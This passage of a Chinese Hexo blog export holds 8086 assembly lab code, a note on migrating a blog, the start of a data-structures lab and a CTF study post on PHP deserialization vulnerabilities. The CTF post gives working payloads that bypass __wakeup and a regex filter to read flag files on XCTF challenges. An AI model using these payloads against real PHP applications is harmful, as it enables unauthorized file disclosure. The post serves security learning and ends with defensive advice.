     MOV SI,OFFSET PASS
     CLD
     
     REPE CMPSB  ;字符串比较
     JZ WELCOME    ;ZF=1，表示一样，跳到WELCOME

       
WRONGPASS:
     MOV AH,2
     MOV DL,0AH
     INT 21H
     MOV AH,2
     MOV DL,0AH
     INT 21H
     MOV AX,2H       ;清屏
     MOV BH,0
     MOV DH,0
     MOV DL,0
     INT 10H  
     MOV AH,9             ;黑白显示  
     MOV DX,OFFSET ERROR
     INT 21H
     JMP PASSWORD
WELCOME:
     MOV  AX,0007H    ;输入字符
     INT  10H
     MOV AX,1301H
     MOV BH,0
     MOV BL,0BAH  ;对照p156改了一下颜色,能闪烁了
     MOV CX,COUNT6
     MOV DH,2
     MOV DL,(80-COUNT6)/2
     MOV BP,OFFSET MESG3
     INT 10H
     

EXIT:MOV AH,4CH
     INT 21H
     CODE ENDS
        END BEG

</code></pre>
<h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><p><img src="/2021/07/09/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/clip_image002.png" alt="img"></p>
<p>测试输入错误的情况：</p>
<p><img src="/2021/07/09/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/clip_image002-1625826094599.png" alt="img"></p>
<p><img src="/2021/07/09/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/clip_image004.png" alt="img"></p>
<p>输入错误会回显<code>“Wrong！try again!”</code>，并让用户重新输入用户名。</p>
<p>测试输入正确的情况：</p>
<p><img src="/2021/07/09/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/clip_image002-1625826125460.png" alt="img"></p>
<p><img src="/2021/07/09/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/clip_image004-1625826125461.png" alt="img"></p>
<p>用户名输入正确会提示用户输入密码</p>
<p>下面测试密码错误情形：<strong>（密码不直接显示，以*<em>*</em>*代替）</strong></p>
<p><img src="/2021/07/09/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/clip_image002-1625826133174.png" alt="img"></p>
<p><img src="/2021/07/09/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/clip_image002-1625826145499.png" alt="img"></p>
<p>下面测试密码正确的情形：</p>
<p><img src="/2021/07/09/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/clip_image002-1625826156551.png" alt="img"></p>
<h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><blockquote>
<p>运用微机系统串行口知识，进行微机系统串行口的测试；完成硬件测试环境；编写程序对微机系统的串口进行自收自发外环测试；数据发送从键盘输入，接收数据时在屏幕显示。</p>
</blockquote>
<pre><code>.586
DATA SEGMENT USE16
BUF DB 30 DUP(?)
DATA ENDS

CODE SEGMENT USE16
    ASSUME CS:CODE, DS:DATA
START:
    MOV AX, DATA
    MOV DS, AX
    CALL I8250          ; 8250初始化 
    MOV BX, OFFSET BUF
SEND:
    MOV DX, 2FDH    ;通信状态寄存器
    IN AL, DX
    TEST AL, 20H   ;0010 0000 B 检查发送保持寄存器是否为空，D5为1 空闲，为0继续循环等待
    JZ SEND        ;不空闲
    MOV DX, 2F8H   ; 发送保持寄存器
    MOV AH, 1    ;1号功能调用，键盘输入字符
    INT 21H
    CMP AL, 0DH  ;接收到回车表明发送结束，0DH是回车
    JZ DISP
    OUT DX, AL   ;写数据
RECE:
    MOV DX, 2FDH
    IN AL, DX
    TEST AL, 01H
    JZ RECE             ; 判断一帧数据接收完整
    MOV DX, 2F8H
    IN AL, DX
    MOV [BX], AL
    INC BX
    JMP SEND
    
DISP:
    MOV BYTE PTR [BX+1], '$'
    MOV AH, 09H         ; 09号功能调用，显示字符串
    MOV DX, OFFSET BUF
    INT 21H             
    
EXIT:
    MOV AH,4CH
    INT 21H             ; 结束程序
    
I8250 PROC
    MOV DX, 2FBH    ;通信控制寄存器
    MOV AL, 80H     ; 1000 0000B  D7=1，访问除数寄存器
    OUT DX, AL

    MOV DX, 2F9H    ;设置分频系数
    MOV AL, 0
    OUT DX, AL
    MOV DX, 2F8H
    MOV AL, 60H     ;1200波特
    OUT DX, AL

    MOV DX, 2FBH    ;定义一帧数据格式（8个数据位，一个停止位，无校验）
    MOV AL, 03H
    OUT DX, AL

    MOV DX, 2F9H    ;设置中断允许寄存器，此处使用查询方式，即禁止中断
    MOV AL, 0
    OUT DX, AL

    MOV DX, 2FCH    ;设置MODEM控制寄存器
    MOV AL, 0     ;D3=0采用查询方式
    OUT DX, AL
    RET         
I8250 ENDP
    
CODE ENDS
    END START
</code></pre>
<h2 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h2><blockquote>
<p>在开放式微机实验装置上完成相应硬件电路连接；编写程序实现：8254的三个计数器输出不同周期的信号，控制发光二极管，达到流光效果。</p>
<p>注：</p>
<p>实验时所用的外扩8254的OUT0,OUT1,OUT2分别接到LED显示区L7，L6，L5，其中OUT0为计数器0的输出，通过公式 <strong>N = fclk/fout = Tout/Tclk</strong>（N为计数器初值） 可计算得到输出信号的频率与周期。以计数器0为例，我们选用的CLK0,CLK1,CLK2均为1kHz,即周期为1ms，想使L7的闪烁周期为1s，即Tout=1s,则N=1s/1ms=1000。数制选择使用二进制，则在向计数器0写初值时可以直接写1000，或者写1000的16进制。</p>
</blockquote>
<pre><code>.486
CODE SEGMENT USE16
     ASSUME CS:CODE
BEG: JMP START

CCONBIT1  EQU 00110110B ; 0号计数器初始化控制字
CCONBIT2  EQU 01110110B ; 1号计数器初始化控制字
CCONBIT3  EQU 10110110B ; 2号计数器初始化控制字

CDPORT1   EQU 210H      ; 0号计数器口地址 
CDPORT2   EQU 211H      ; 1号计数器口地址 
CDPORT3   EQU 212H      ; 2号计数器口地址
CCONPORT  EQU 213H      ;控制口地址
        
CHDBIT1   EQU 1000      ;计数器0初值 T_OUT=1S
CHDBIT2   EQU 2000      ;计数器1初值 T_out=2s
CHDBIT3   EQU 4000      ;计数器2初值 T_out=4s

START:    NOP              ;启动延时
          MOV DX,CCONPORT  ;写入控制字_计数器0
          MOV AL,CCONBIT1
          OUT DX,AL
          MOV AX,CHDBIT1   ;写入初值_计数器0
          MOV DX,CDPORT1   
          OUT DX,AL
          MOV AL,AH
          OUT DX,AL
          MOV DX,CCONPORT  ;写入控制字_计数器1
          MOV AL,CCONBIT2
          OUT DX,AL
          MOV AX,CHDBIT2   ;写入初值_计数器1
          MOV DX,CDPORT2   
          OUT DX,AL
          MOV AL,AH
          OUT DX,AL
          MOV DX,CCONPORT  ;写入控制字_计数器2
          MOV AL,CCONBIT3
          OUT DX,AL
          MOV AX,CHDBIT3   ;写入初值_计数器2
          MOV DX,CDPORT3   
          OUT DX,AL
          MOV AL,AH
          OUT DX,AL
WT:       NOP
          JMP WT
            
CODE      ENDS
          END BEG
</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>微机原理</category>
      </categories>
      <tags>
        <tag>80x86</tag>
        <tag>8250</tag>
        <tag>8259A</tag>
        <tag>8255</tag>
        <tag>8254</tag>
      </tags>
  </entry>
  <entry>
    <title>新电脑迁移hexo</title>
    <url>/2025/07/11/%E6%96%B0%E7%94%B5%E8%84%91%E8%BF%81%E7%A7%BBhexo/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>换电脑有段时间了，但是一直没有将hexo博客给迁移到新电脑上，最近研究了一下如何迁移，在这里做一个记录，也作为迁移后的第一篇博客</p>
<p>主要参考下面这篇文章进行：</p>
<p><a href="https://blog.csdn.net/qq_36667170/article/details/118163563">换电脑后怎么迁移hexo博客？_hexo换电脑了怎么办-CSDN博客</a></p>
<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>1.<code>git bash here</code>卡死</p>
<p>尝试过重装、降低git版本、装在C盘等方法都没有解决，后面直接用<code>cmd</code>执行相关命令</p>
<p><img src="https://aband0n.oss-cn-nanjing.aliyuncs.com/img/image-20250712224330583.png" alt="image-20250712224330583"></p>
<p>2.Typora配置阿里云OSS存储权限问题</p>
<p>参考<a href="https://blog.csdn.net/mayuxin1314/article/details/125911299">Typora+阿里云OSS实现图片自动上传（不需要安装软件）_typora oss-CSDN博客</a></p>
<p>不过需要注意创建RAM用户后需要为用户分配相应的权限，例如<code>AliyunOSSFullAccess</code>，否则测试上传的实现会报错权限问题。</p>
<h3 id="待解决的问题"><a href="#待解决的问题" class="headerlink" title="待解决的问题"></a>待解决的问题</h3><p>1.深入学习一下git，后续应该是可以通过git在不同的电脑上进行提交</p>
<p>2.git bash here卡死问题</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化漏洞学习</title>
    <url>/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/</url>
    <content><![CDATA[<p>首先，什么是序列化？</p>
<p><strong>序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。</strong><br><strong>反序列化则相反将字符串重新恢复成对象</strong></p>
<table>
<thead>
<tr>
<th>类型</th>
<th>过程</th>
</tr>
</thead>
<tbody><tr>
<td>序列化</td>
<td>对象—&gt; 字符串</td>
</tr>
<tr>
<td>反序列化</td>
<td>字符串—&gt;对象</td>
</tr>
</tbody></table>
<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/1893076-20200711232303502-1979730084.png" alt="1893076-20200711232303502-1979730084.png" style="zoom:60%;">

<h5 id="1-序列化函数serialize"><a href="#1-序列化函数serialize" class="headerlink" title="1.序列化函数serialize()"></a>1.序列化函数serialize()</h5><pre><code class="line-numbers language-php">&lt;?php
    class Ctf{
        public $flag='flag{****}';
        public $name='cxk';
        public $age='10';
    }
    $ctfer=new Ctf();     //实例化一个对象
    $ctfer-&gt;flag='flag{adedyui}';
    $ctfer-&gt;name='Sch0lar';
    $ctfer-&gt;age='18'
    echo serialize($ctfer);  //将其序列化
?&gt;
</code></pre>
<blockquote>
<p>输出结果 O:3:”Ctf”:3{s:4:”flag”;s:13:”flag{abedyui}”;s:4:”name”;s:7:”Sch0lar”;s:3:”age”;s:2:”18”;} </p>
<p>O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示 </p>
<p>3代表类的名字长三个字符 </p>
<p>Ctf 是类名 </p>
<p>3代表这个类里有三个属性(三个变量)</p>
<p>s代表字符串 </p>
<p>4代表属性名的长度</p>
<p>flag是属性名 s:13:”flag{adedyui}” 字符串，属性长度，属性值</p>
</blockquote>
<p>注：serialize()函数在执行前会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，**<code>__sleep()</code>方法会先被调用，然后才执行序列化操作**。</p>
<p><strong>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性</strong></p>
<p>exp :</p>
<pre><code class="line-numbers language-php">&lt;?php
    class Ctf{
        public $flag='flag{****}';
        public $name='cxk';
        public $age='10';
        public function __sleep(){
            return array('flag','age');
        }
    }
    $ctfer=new Ctf();
    $ctfer-&gt;flag='flag{abedyui}';
    $ctfer-&gt;name='Sch0lar';
    $ctfer-&gt;age='18'
    echo serialize($ctfer);
?&gt;
</code></pre>
<p>运行结果：<strong>O:3:”Ctf”:2:{s:4:”flag”;s:13:”flag{abedyui}”;s:3:”age”;s:2:”18”;}</strong></p>
<p>（注意一下，这边对php的版本有要求，此处我用的是php 5.2.17nts）</p>
<h5 id="2-反序列化函数-unserialize"><a href="#2-反序列化函数-unserialize" class="headerlink" title="2.反序列化函数 unserialize()"></a>2.反序列化函数 unserialize()</h5><pre><code class="line-numbers language-php">&lt;?php
    class Ctf{
        public $flag='flag{****}';
        public $name='cxk';
        public $age='10';
        
    }
    $ctfer=new Ctf();
    $ctfer-&gt;flag='flag{abedyui}';
    $ctfer-&gt;name='Sch0lar';
    $ctfer-&gt;age='18';
    $a = serialize($ctfer);    //O:3:"Ctf":2:{s:4:"flag";s:13:"flag{abedyui}";s:3:"age";s:2:"18";}
    var_dump(unserialize($a));  //输出反序列化的结果
?&gt;
</code></pre>
<p>运行结果：<strong>D:\phpstudy_pro\WWW\sleep.php:13: class Ctf#2 (3) { public $flag =&gt; string(13) “flag{abedyui}” public $name =&gt; string(7) “Sch0lar” public $age =&gt; string(2) “18” }</strong></p>
<pre><code>D:\phpstudy_pro\WWW\sleep.php:13:
class Ctf#2 (3) {
  public $flag =&gt;
  string(13) "flag{abedyui}"
  public $name =&gt;
  string(7) "Sch0lar"
  public $age =&gt;
  string(2) "18"
}
</code></pre>
<p>注：unserialize() 执行时会检查是否存在一个 wakeup() 方法。 如果存在，则会先调用 wakeup方法。而涉及到__wakeup()函数，经常要用到的就是<strong>当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过wakeup()函数的执行。</strong></p>
<blockquote>
<p>__sleep()函数是在serialize(序函数列化一个对象前被调用，用来指定要序列化的属性</p>
<p>__wakeup()函数则是在unserialize()反序列化一个字符串前被调用</p>
</blockquote>
<p>关于__wakeup()的实例：</p>
<h6 id="1-攻防世界-web高手进阶区-unserialize3-wakeup-魔术方法"><a href="#1-攻防世界-web高手进阶区-unserialize3-wakeup-魔术方法" class="headerlink" title="1.攻防世界 web高手进阶区 unserialize3 (__wakeup()魔术方法)"></a>1.攻防世界 web高手进阶区 unserialize3 (<strong>__wakeup()魔术方法</strong>)</h6><p><a href="https://blog.csdn.net/LTtiandd/article/details/99591998">攻防世界unserialize3题解</a></p>
<blockquote>
<p>__wakeup() 将在被序列化后立即被调用 </p>
<p><strong>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，会导致反序列化失败同时不会执行__wakeup()函数</strong></p>
</blockquote>
<pre><code class="line-numbers language-php">&lt;?php
class Ab4ndon{
        var $test = '123';
}

$a = new Ab4ndon();    //这里就是创建了一个新的对象

$a_ser = serialize($a);   //将这个对象进行字符串封装，就是对其进行序列化

//print_r($a_ser);
$a_unser = unserialize($a_ser);//进行反序列化

print_r($a_unser);
?&gt;
</code></pre>
<p>代码：</p>
<pre><code class="line-numbers language-php">&lt;?php
class xctf{
    public $flag = '111';
    public function __wakeup(){
    exit('bad requests');
    }
}//这边注意一下方括号要对应，一开始少了这个方括号一直报错
    $a = new xctf();
    $a_ser = serialize($a);   //将这个对象进行字符串封装，就是对其进行序列化

print_r($a_ser);  //输出序列化后的内容
?&gt;
</code></pre>
<p>序列化结果：</p>
<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
<p>利用__wakeup()的漏洞，构造payload为：**?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}**</p>
<h5 id="3-访问控制修饰符"><a href="#3-访问控制修饰符" class="headerlink" title="3.访问控制修饰符"></a>3.访问控制修饰符</h5><pre><code>public(公有) 
protected(受保护)     // %00*%00属性名
private(私有的)       // %00类名%00属性名
</code></pre>
<p>在本地写个php测试一下:</p>
<pre><code class="line-numbers language-php">&lt;?php
    class Ctf{
        public $name='Ab4ndon';
        protected $age='20';
        private $flag='fl4g';
    }
    $ctfer=new Ctf();     //实例化一个对象
    echo serialize($ctfer);
?&gt;
</code></pre>
<p>输出结果：*<em>O:3:”Ctf”:3:{s:4:”name”;s:7:”Ab4ndon”;s:6:”<em>age”;s:2:”20”;s:9:”Ctfflag”;s:4:”fl4g”;}</em></em></p>
<blockquote>
<p>可以看到，protected 属性被序列化后age属性名的长度变成了6,为什么呢？因为age前还有**%00*%00**</p>
<p>同样地，private 属性被序列化后flag属性名的长度也不是flag的原长，因为flag前面还有**%00Ctf%00**</p>
</blockquote>
<p>下面介绍一个考察__wakeup()和访问控制修饰符的题：</p>
<h6 id="1-攻防世界-web高手进阶区-Web-php-unserialize"><a href="#1-攻防世界-web高手进阶区-Web-php-unserialize" class="headerlink" title="1.攻防世界 web高手进阶区 Web_php_unserialize"></a>1.攻防世界 web高手进阶区 Web_php_unserialize</h6><p>源码：</p>
<pre><code class="line-numbers language-php">&lt;?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) {     //执行 __construct 方法，将传入的 $file 赋值给本地的私有方法 $file
        $this-&gt;file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this-&gt;file, true);   //销毁时执行 __destruct 方法，高亮本地变量 file 文件的代码
    }
    function __wakeup() { 
        if ($this-&gt;file != 'index.php') {        //当反序列化构造这个类时执行 __wakeup 方法，会将本地变量 file                                                     重新设置为 index.php
            //the secret is in the fl4g.php
            $this-&gt;file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']);         //base64编码传入的var参数
    if (preg_match('/[oc]:\d+:/i', $var)) {     //正则匹配 o:数字：或者 c:数字：，不区分大小写
        die('stop hacking!'); 
    } else {
        @unserialize($var);                     //反序列化
    } 
} else { 
    highlight_file("index.php"); 
} 
?&gt;
</code></pre>
<p>思路大致为：</p>
<p>构造Demo类，传入$file=fl4g.php(传入的$file赋值给本地私有方法$file，然后__destruct()函数在对象销毁时执行，高亮本地变量file的代码，故我们将file赋值为我们想看的fl4g.php),然后将其序列化</p>
<pre><code class="line-numbers language-php">&lt;?php 
class Demo { 
    private $file = 'fl4g.php';
}

$a =new Demo($file);
echo serialize($a);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}

</code></pre>
<p>将序列化结果中的属性个数改为2（绕过__wakeup()函数的执行），将o:4改为o:+4或者o:@4(绕过正则匹配)，Base64编码后get传参</p>
<p>但是这样操作得不到flag，问题出在哪？</p>
<p>$file是私有方法 private,前面提到private属性被序列化后属性名的形式为**%00类名%00属性名**,我们看到file本该是4个字符，序列化后确实10个字符。我尝试在Demo前后加%00再编码，失败，后来看别人的wp，才找到原因，<strong>因为复制粘贴时破坏了 “ %00 “ 这个特殊字符。 将序列化后的字符串直接存入文件不会破坏这个 “ %00 “ 特殊字符。</strong></p>
<pre><code class="line-numbers language-php">&lt;?php 
class Demo { 
    private $file = 'fl4g.php';
}

$c =new Demo($file);
$a=serialize($c);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}

$a = str_replace(':1:', ':2:', $a);        //绕过wakeup
$a = str_replace('O:4', 'O:+4', $a);        //绕过正则匹配
print_r($a);
print_r("&lt;br&gt;");
var_dump(base64_encode($a));        //base64编码
//O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}&lt;br&gt;D:\phpstudy_pro\WWW\sleep.php:13:
//string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
</code></pre>
<p>所以构造payload:<strong>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</strong></p>
<blockquote>
<p>注意学习这种直接写php去得到payload的方法，尤其是碰到private和protected时</p>
<p>此处再贴一篇wp:<a href="https://moreant.github.io/post/60542.html">攻防世界 WEB Web_php_unserialize</a></p>
</blockquote>
<h5 id="4-魔术方法"><a href="#4-魔术方法" class="headerlink" title="4.魔术方法"></a>4.魔术方法</h5><p><strong>php反序列化漏洞触发条件：</strong> unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法</p>
<p>接下来介绍一些常见的魔术方法（wakeup()和sleep()函数在前面已经介绍过了，就不再详述）</p>
<pre><code>__construct() 当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。

__destruct() 当一个对象销毁（反序列化）时被调用

__toString() 当一个对象被当作一个字符串使用时被调用

__sleep() 在对象在被序列化之前立即运行

__wakeup() 将在序列化之后立即被调用
</code></pre>
<h6 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h6><pre><code class="line-numbers language-php">&lt;?php
class xctf{
    public $flag = '111';
    function __construct() {
        echo ("Ab4ndon!");
    }
}
    
    $a = new xctf();
    
?&gt;
</code></pre>
<p>运行结果：<strong>Ab4ndon!</strong></p>
<p>可以很清楚地看出来construct()魔术方法在创建对象时进行了调用</p>
<h6 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h6><pre><code class="line-numbers language-php">&lt;?php
class Example {
    var $var = '';
    function __destruct() {
        highlight_file($this-&gt;var);  //常用文件读取函数：readfile（需要去源码里看） highlight_file                                                                       show_source            file_get_contents（不会输出）
    }
}
unserialize($_GET['a']);
/*$obj = new Example();            //实例化一个对象，并将其序列化：O:7:"Example":1:{s:3:"var";s:8:"flag.php";}
$obj-&gt;var='flag.php';
var_dump(serialize($obj));
*/
?&gt;　
    
    
  //flag.php
    &lt;?php
$flag="flag!!!!!";
</code></pre>
<p>payload如下：<code>?a=O:7:"Example":1:{s:3:"var";s:8:"flag.php";}</code></p>
<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011115348580.png" alt="image-20201011115348580" style="zoom:67%;">

<h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><h5 id="5-session反序列化"><a href="#5-session反序列化" class="headerlink" title="5.session反序列化"></a>5.session反序列化</h5><p>在php.ini中存在三项配置项：</p>
<ul>
<li><code>session.save_path=""</code> –设置session的存储路径</li>
<li><code>session.save_handler=""</code> –<strong>设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</strong></li>
<li><code>session.auto_start boolen</code> –指定会话模块是否在请求开始时启动一个会话，默认为0不启动</li>
<li><code>session.serialize_handler string</code> –<strong>定义用来序列化/反序列化的处理器名字。默认使用php (php&lt;5.5.4)</strong></li>
</ul>
<p><strong>在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</strong></p>
<table>
<thead>
<tr>
<th>引擎</th>
<th>session存储方式</th>
</tr>
</thead>
<tbody><tr>
<td>php(php&lt;5.5.4)</td>
<td>存储方式是，键名+竖线`</td>
</tr>
<tr>
<td>php_serialize(php&gt;5.5.4)</td>
<td>存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化）</td>
</tr>
<tr>
<td>php_binary</td>
<td>存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</td>
</tr>
</tbody></table>
<p>在PHP (php&lt;5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set('session.serialize_handler', '需要设置的引擎名');</code>进行设置。</p>
<p>示例代码如下：</p>
<pre><code class="line-numbers language-php">&lt;?php
ini_set('session.serialize_handler', 'php_serialize');   //设置序列化引擎使用php_serialize
session_start();
// do something
......
</code></pre>
<p><strong>由于序列化和反序列化所使用的序列化引擎不一样就是造成PHP Session序列化漏洞的原因</strong></p>
<p>（此处使用的是php7.3.4nts）</p>
<ul>
<li>php引擎</li>
</ul>
<pre><code class="line-numbers language-php">&lt;?php
ini_set('session.serialize_handler', 'php');
session_start();      // session_start()会创建新会话或者重用现有会话
$_SESSION['name'] = 'Ab4ndon';
var_dump();
?&gt;
</code></pre>
<p>去本地文件夹下找到存储session文件的地方，如我的：D:\phpstudy_pro\Extensions\tmp\tmp，发现一个sess开头的文件，sess_后面是PHPSESSID的值</p>
<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011105453092.png" alt="image-20201011105453092" style="zoom:50%;">

<p>打开，内容为：<strong>name|s:7:”Ab4ndon”;</strong>     <strong>键名+竖线<code>|</code>+经过serialize()函数序列处理的值（只序列化值</strong>）</p>
<ul>
<li>php_serialize引擎</li>
</ul>
<pre><code class="line-numbers language-php">&lt;?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();      // session_start()会创建新会话或者重用现有会话
$_SESSION['name'] = 'Ab4ndon';
var_dump();
?&gt;
</code></pre>
<p>文件内容：<strong>a:1:{s:4:”name”;s:7:”Ab4ndon”;}</strong>    <strong>a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key(键)和value(值)都会进行序列化</strong>。</p>
<ul>
<li>php_binary</li>
</ul>
<pre><code class="line-numbers language-php">&lt;?php
ini_set('session.serialize_handler', 'php_binary');
session_start();      // session_start()会创建新会话或者重用现有会话
$_SESSION['name'] = 'Ab4ndon';
var_dump();
?&gt;
</code></pre>
<p>文件内容：<strong>names:7:”Ab4ndon”;</strong>      键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值.由于name的长度是4，4在ASCII表中对应的就是。根据php_binary的存储规则，最后就是<code>names:7:"Ab4ndon";</code> </p>
<h5 id="6-字符串逃逸"><a href="#6-字符串逃逸" class="headerlink" title="6.字符串逃逸"></a>6.字符串逃逸</h5><img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/YqFpH1.png" alt="1" style="zoom:67%;">

<p>首先我们需要知道，在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。而且最后变量闭合都需要双引号以及结束的花括号，举个例子：</p>
<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
<p>和</p>
<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx</code>(xxx是任意的一串字符)</p>
<p>反序列化后的结果是一样的，也就是说，php在反序列化的时候是严格地按照一定的格式去进行的。</p>
<p>如果指定的长度错误则反序列化就会失败。</p>
<p>测试如下：</p>
<pre><code class="line-numbers language-php">&lt;?php
class xctf{
    public $flag = '111';
}
    
    $a = new xctf();
    $a_ser = serialize($a);   //O:4:"xctf":1:{s:4:"flag";s:3:"111";}

//print_r($a_ser);
$res=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}');
$res2=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx');
$res3=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"11";}');
print_r($res);
print_r($res2);
print_r($res3);

?&gt;
</code></pre>
<pre><code>//输出结果
xctf Object          //$res
(
    [flag] =&gt; 111
)
xctf Object            //$res2
(
    [flag] =&gt; 111
)
</code></pre>
<p>如果我们将111改为11，就会反序列化失败，我的vscode没有任何输出。</p>
<p>为什么呢？因为此时的flag所读取的数据为11“而<strong>正常的语法是需要用”;去闭合当前的变量，而因为长度错误所以此时php把闭合的双引号当做了字符串，所以下一个字符就成了分号，没能闭合导致抛出了错误。</strong></p>
<p><a href="https://www.cnblogs.com/Sumarua/p/12932401.html"></a><a href="https://www.cnblogs.com/Sumarua/p/12932401.html">PHP反序列化字符逃逸详解</a></p>
<p><a href="https://www.cnblogs.com/hello-there/p/12870541.html">浅谈PHP字符串逃逸</a></p>
<p>知识补充<br>unserialize漏洞依赖几个条件：</p>
<p>unserialize函数的参数可控<br>脚本中存在一个构造函数（__construct()）、析构函数（__destruct()）、__wakeup()函数中有向php文件中写数据的操作的类<br>所写的内容需要有对象中的成员变量的值<br>防范的方法有：</p>
<ol start="4">
<li>严格控制unserialize函数的参数，坚持用户所输入的信息都是不可靠的原则</li>
<li>对于unserialize后的变量内容进行检查，以确定内容没有被污染</li>
</ol>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>【NJUPT】数据结构实验(合集)</title>
    <url>/2025/06/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><h3 id="1-顺序表的初始化、查找、插入、删除、输出、撤销等操作"><a href="#1-顺序表的初始化、查找、插入、删除、输出、撤销等操作" class="headerlink" title="1.顺序表的初始化、查找、插入、删除、输出、撤销等操作"></a>1.顺序表的初始化、查找、插入、删除、输出、撤销等操作</h3><pre><code class="line-numbers language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define ERROR 0
#define OK 1
#define Overflow 2
#define Underflow 3
#define NotPresent 4
#define Duplicate 5

typedef int ElemType;
typedef struct seqlist
{
